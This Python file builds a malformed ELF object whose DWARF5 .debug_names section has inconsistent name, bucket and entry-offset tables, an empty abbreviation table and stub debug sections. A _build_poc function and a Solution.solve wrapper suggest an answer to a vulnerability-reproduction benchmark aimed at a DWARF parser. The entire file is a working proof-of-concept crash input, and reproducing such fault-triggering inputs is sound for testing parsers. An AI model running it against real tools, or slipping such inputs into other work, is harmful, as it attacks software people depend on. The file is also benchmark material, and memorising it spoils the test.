import struct
from typing import List, Tuple, Dict


def _align(off: int, a: int) -> int:
    if a <= 1:
        return off
    r = off % a
    return off if r == 0 else off + (a - r)


def _uleb128(x: int) -> bytes:
    out = bytearray()
    while True:
        b = x & 0x7F
        x >>= 7
        if x:
            out.append(b | 0x80)
        else:
            out.append(b)
            break
    return bytes(out)


def _make_debug_names(name_count: int = 16, bucket_count: int = 16, comp_unit_count: int = 1) -> bytes:
    version = 5
    padding = 0
    local_tu_count = 0
    foreign_tu_count = 0
    # Minimal abbrev table: single 0 (end marker)
    abbrev_table = b"\x00"
    abbrev_table_size = len(abbrev_table)
    augmentation_string = b""
    augmentation_string_size = len(augmentation_string)

    header = struct.pack(
        "<HHIIIIIII",
        version,
        padding,
        comp_unit_count,
        local_tu_count,
        foreign_tu_count,
        bucket_count,
        name_count,
        abbrev_table_size,
        augmentation_string_size,
    )

    cu_offsets = b"".join(struct.pack("<I", 0) for _ in range(comp_unit_count))
    # No local/foreign tables since counts are 0
    buckets = b"".join(struct.pack("<I", 1) for _ in range(bucket_count))
    hashes = b"\x00" * (4 * name_count)
    name_offsets = b"\x00" * (4 * name_count)  # all point to start of .debug_str (NUL)
    entry_offsets = b"\x00" * (4 * name_count)  # all point to start of entry pool (empty)

    unit_body = header + augmentation_string + cu_offsets + buckets + hashes + name_offsets + entry_offsets + abbrev_table
    unit_length = len(unit_body)
    return struct.pack("<I", unit_length) + unit_body


def _make_debug_info_minimal_dwarf5_compile_unit() -> bytes:
    # DWARF5 unit header:
    # unit_length (4) excludes itself
    # version (2) = 5
    # unit_type (1) = DW_UT_compile (0x01)
    # address_size (1) = 8
    # debug_abbrev_offset (4) = 0
    body = struct.pack("<HBBI", 5, 0x01, 8, 0)
    return struct.pack("<I", len(body)) + body


def _build_elf64_little(sections: List[Tuple[str, bytes, int, int, int]]) -> bytes:
    # sections: list of (name, data, sh_type, sh_flags, sh_addralign), excluding the initial SHT_NULL (added here)
    # Build shstrtab
    shstr_parts = [b"\x00"]
    name_offsets: Dict[str, int] = {"": 0}
    for name, _, _, _, _ in [(".shstrtab", b"", 3, 0, 1)] + sections:
        if name in name_offsets:
            continue
        name_offsets[name] = sum(len(p) for p in shstr_parts)
        shstr_parts.append(name.encode("ascii", "strict") + b"\x00")
    shstrtab = b"".join(shstr_parts)

    # Build section list with SHT_NULL and .shstrtab at index 1
    SHT_NULL = 0
    SHT_STRTAB = 3
    sec_list: List[Tuple[str, bytes, int, int, int]] = [("", b"", SHT_NULL, 0, 0), (".shstrtab", shstrtab, SHT_STRTAB, 0, 1)]
    sec_list.extend(sections)

    # Layout
    ehdr_size = 64
    shentsize = 64
    file_parts = [b"\x00" * ehdr_size]
    offsets: List[int] = [0] * len(sec_list)
    sizes: List[int] = [0] * len(sec_list)

    off = ehdr_size
    for i, (name, data, sh_type, sh_flags, sh_addralign) in enumerate(sec_list):
        if i == 0:
            offsets[i] = 0
            sizes[i] = 0
            continue
        a = sh_addralign if sh_addralign else 1
        off = _align(off, a)
        if off > sum(len(p) for p in file_parts):
            file_parts.append(b"\x00" * (off - sum(len(p) for p in file_parts)))
        offsets[i] = off
        sizes[i] = len(data)
        file_parts.append(data)
        off += len(data)

    off = sum(len(p) for p in file_parts)
    shoff = _align(off, 8)
    if shoff > off:
        file_parts.append(b"\x00" * (shoff - off))

    # Section headers
    shdrs = []
    for i, (name, data, sh_type, sh_flags, sh_addralign) in enumerate(sec_list):
        sh_name = name_offsets.get(name, 0)
        sh_addr = 0
        sh_offset = offsets[i]
        sh_size = sizes[i]
        sh_link = 0
        sh_info = 0
        sh_entsize = 0
        sh_addralign_eff = sh_addralign if sh_addralign else 1
        shdrs.append(
            struct.pack(
                "<IIQQQQIIQQ",
                sh_name,
                sh_type,
                sh_flags,
                sh_addr,
                sh_offset,
                sh_size,
                sh_link,
                sh_info,
                sh_addralign_eff,
                sh_entsize,
            )
        )
    sh_table = b"".join(shdrs)
    file_parts.append(sh_table)

    # ELF header
    e_ident = bytearray(16)
    e_ident[0:4] = b"\x7fELF"
    e_ident[4] = 2  # ELFCLASS64
    e_ident[5] = 1  # ELFDATA2LSB
    e_ident[6] = 1  # EV_CURRENT
    e_ident[7] = 0  # System V
    e_type = 1  # ET_REL
    e_machine = 62  # EM_X86_64
    e_version = 1
    e_entry = 0
    e_phoff = 0
    e_flags = 0
    e_ehsize = ehdr_size
    e_phentsize = 0
    e_phnum = 0
    e_shentsize = shentsize
    e_shnum = len(sec_list)
    e_shstrndx = 1

    ehdr = struct.pack(
        "<16sHHIQQQIHHHHHH",
        bytes(e_ident),
        e_type,
        e_machine,
        e_version,
        e_entry,
        e_phoff,
        shoff,
        e_flags,
        e_ehsize,
        e_phentsize,
        e_phnum,
        e_shentsize,
        e_shnum,
        e_shstrndx,
    )

    out = bytearray(b"".join(file_parts))
    out[0:ehdr_size] = ehdr
    return bytes(out)


def _build_poc() -> bytes:
    debug_names = _make_debug_names(name_count=16, bucket_count=16, comp_unit_count=1)
    debug_str = b"\x00"
    debug_info = _make_debug_info_minimal_dwarf5_compile_unit()
    debug_abbrev = b"\x00"

    SHT_PROGBITS = 1
    sections = [
        (".debug_names", debug_names, SHT_PROGBITS, 0, 1),
        (".debug_str", debug_str, SHT_PROGBITS, 0, 1),
        (".debug_info", debug_info, SHT_PROGBITS, 0, 1),
        (".debug_abbrev", debug_abbrev, SHT_PROGBITS, 0, 1),
    ]
    return _build_elf64_little(sections)


class Solution:
    def solve(self, src_path: str) -> bytes:
        return _build_poc()